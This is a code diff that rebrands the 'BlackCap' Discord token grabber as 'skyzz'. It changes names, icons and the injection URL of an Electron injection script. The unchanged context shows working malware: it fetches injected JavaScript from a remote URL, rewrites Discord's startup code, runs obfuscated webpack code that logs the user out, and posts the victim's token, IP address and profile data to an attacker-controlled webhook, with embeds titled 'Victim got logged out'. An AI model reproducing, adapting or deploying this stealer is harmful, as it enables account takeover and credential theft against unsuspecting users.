@@ -26,7 +26,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://github.com/Skyzz-Dev/heef/edit/main/index.js",
     webhook: "%WEBHOOK%",
     filter2: {
         urls: [
@@ -113,7 +113,7 @@ if (fs.existsSync(bdPath)) require(bdPath);`;
 
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
     }
-    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
+    if (!fs.existsSync(path.join(__dirname, "skyzz"))) return !0;
     execScript(
         `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
     );
@@ -234,17 +234,17 @@ async function FirstTime() {
     window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
 
         if (config['init-notify'] == "true") {
-            if (fs.existsSync(path.join(__dirname, "blackcap"))) {
-                fs.rmdirSync(path.join(__dirname, "blackcap"));
+            if (fs.existsSync(path.join(__dirname, "skyzz"))) {
+                fs.rmdirSync(path.join(__dirname, "skyzz"));
                 if (token == null || token == undefined || token == "") {
                     var {
                         ip
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     const c = {
-                        username: "BlackCap",
+                        username: "skyzz",
                         content: "",
                         embeds: [{
-                            title: "BlackCap Initalized",
+                            title: "skyzz Initalized",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -252,7 +252,7 @@ async function FirstTime() {
                                 inline: !1
 							}],
                             author: {
-                                name: "BlackCap"
+                                name: "skyzz"
                             },
                             footer: {
                                 text: "©KSCH | https://github.com/KSCHdsc"
@@ -267,17 +267,17 @@ async function FirstTime() {
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     
                     if(b.avatar === null){
-                        usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                        usericonurl = "https://cdn.discordapp.com/attachments/1048314321081475104/1048322720636620851/unknown.png"
                     }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                     if(b.banner === null){
-                        bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+                        bannerurl = "https://cdn.discordapp.com/attachments/1048314321081475104/1048322720636620851/unknown.png"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
-                        username: "BlackCap",
+                        username: "skyzz",
                         content: "",
                         embeds: [{
-                            title: "BlackCap Initalized",
-                            description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                            title: "skyzz Initalized",
+                            description: "[skyzz │ **Oh you have skyzz someone**](https://github.com/KSCHdsc)",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -309,7 +309,7 @@ async function FirstTime() {
                                 inline: !0
 								}, {
                                 name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                                value: `[skyzz 2021 <a:blackcapgif:1041634542093619260>](skyzz mgl)`,
                                 inline: !0
 								}, {
                                 name: "<a:tokens:1041634540537511957> Token",
@@ -335,11 +335,11 @@ async function FirstTime() {
 
 
 
-                if (!fs.existsSync(path.join(__dirname, "blackcap"))) {
+                if (!fs.existsSync(path.join(__dirname, "skyzz"))) {
                     return !0
                 }
 
-                fs.rmdirSync(path.join(__dirname, "blackcap"));
+                fs.rmdirSync(path.join(__dirname, "skyzz"));
                 if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                     if (config['logout-notify'] == "true") {
                         if (token == null || token == undefined || token == "") {
@@ -347,10 +347,10 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             const c = {
-                                username: "BlackCap Grabber",
+                                username: "skyzz Grabber",
                                 content: "",
                                 embeds: [{
-                                    title: "BlackCaped User log out (User not Logged in before)",
+                                    title: " User log out (User not Logged in before)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -358,7 +358,7 @@ async function FirstTime() {
                                         inline: !1
 							}],
                                     author: {
-                                        name: "BlackCap"
+                                        name: "skyzz"
                                     },
                                     footer: {
                                         text: "©KSCH | https://github.com/KSCHdsc"
@@ -373,17 +373,17 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             if(b.avatar === null){
-                                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
+                                usericonurl = "https://cdn.discordapp.com/attachments/1048314321081475104/1048322720636620851/unknown.png"
                             }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                             if(b.banner === null){
                                 bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
-                                username: "BlackCap Grabber",
+                                username: "skyzz Grabber",
                                 content: "",
                                 embeds: [{
-                                    title: "BlackCap Victim got logged out",
-                                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                                    title: "skyzz Victim got logged out",
+                                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have token someone**](https://github.com/KSCHdsc)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -411,7 +411,7 @@ async function FirstTime() {
                                         inline: !0
 								}, {
                                         name: "@Copyright",
-                                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
+                                        value: `[skyzz 2021 <a:blackcapgif:1041634542093619260>]()`,
                                         inline: !0
 								}, {
                                         name: "<a:tokens:1041634540537511957> Token",
